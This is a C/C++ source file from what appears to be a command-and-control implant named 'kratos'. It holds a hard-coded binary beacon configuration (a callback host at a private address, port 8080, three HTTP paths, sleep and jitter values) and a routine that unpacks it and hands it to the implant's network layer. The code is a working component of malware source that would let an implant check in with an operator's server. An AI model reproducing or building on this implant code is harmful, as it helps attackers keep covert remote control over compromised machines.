#include "config/config.h"
#include "net/net.h"


PBYTE GetConfig() {
	// Domain "192.168.1.20\0", port 8080, HTTP, 3 paths, sleep 5, jitter 5
	return (PBYTE)"\x0D\x00\x00\x00\x31\x39\x32\x2E\x31\x36\x38\x2E\x31\x2E\x32\x30\x00\x90\x1F\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00\x2F\x74\x65\x73\x74\x00\x07\x00\x00\x00\x2F\x74\x65\x73\x74\x32\x00\x07\x00\x00\x00\x2F\x74\x65\x73\x74\x33\x00\x05\x00\x00\x00\x05\x00\x00\x00";
}


INT32 GetConfigSize() {
	return 69;
}



/*
	[Domain len]  4 Bytes
	[Domain str]  N Bytes
	[Domain port] 4 Bytes
	[IsHttps]     4 Bytes
	[Total Paths] 4 Bytes
	for each path
		[Path len]    4 Bytes
		[Path str]    N Bytes
	[Sleep time] 4 Bytes
	[Jitter %]   4 Bytes
*/
BOOL ParseConfig( ) {
	//return TRUE; // just for now till builder done
	PCHAR Paths[ 5 ] = { 0 };
	DEBUG_LOG("[*] Parsing config");

	packager->NewUnPacker( GetConfig( ), GetConfigSize( ) );

	auto DomainLen = packager->UnPack4( );
	PCHAR Domain = ( PCHAR )packager->UnPackBytes( DomainLen );
	if ( ! Domain ) { return FALSE; }
	DEBUG_LOG("[*] Parsed Domain");

	auto Port = packager->UnPack4( );
	auto Https = packager->UnPack4( );
	auto TotalPaths = packager->UnPack4( );
	DEBUG_LOG("[*] Parsed Port, https, and total paths");

	if ( TotalPaths < 0 || TotalPaths > 5 ) {
		if ( Domain ) { kratos->apis.LocalFree( Domain ); }
		return FALSE;
	}

	for (INT32 i = 0; i < TotalPaths; i++) {
		auto pathLen = packager->UnPack4( );
		PCHAR Path = ( PCHAR )packager->UnPackBytes( pathLen );
		if ( ! Path ) {
			for ( INT32 j = 0; j < i; j++ ) { kratos->apis.LocalFree( Paths[ j ] ); }
			if ( Domain ) { kratos->apis.LocalFree( Domain ); }
			return FALSE;
		}
		Paths[ i ] = Path;
		DEBUG_LOG("[+] Got path");
	}

	DEBUG_LOG("[*] Setting config");

	BOOL ok = net->SetHttpConfig( TotalPaths, Domain, Port, Https, Paths );

	for ( INT32 i = 0; i < TotalPaths; i++ ) {
		if ( Paths[ i ] ) { kratos->apis.LocalFree( Paths[ i ] ); }
	}
	if ( Domain ) { kratos->apis.LocalFree( Domain ); }

	if ( ! ok ) {
		return FALSE;
	}

	kratos->settings.Sleep  = packager->UnPack4( );
	kratos->settings.Jitter = packager->UnPack4( );
	return TRUE;
}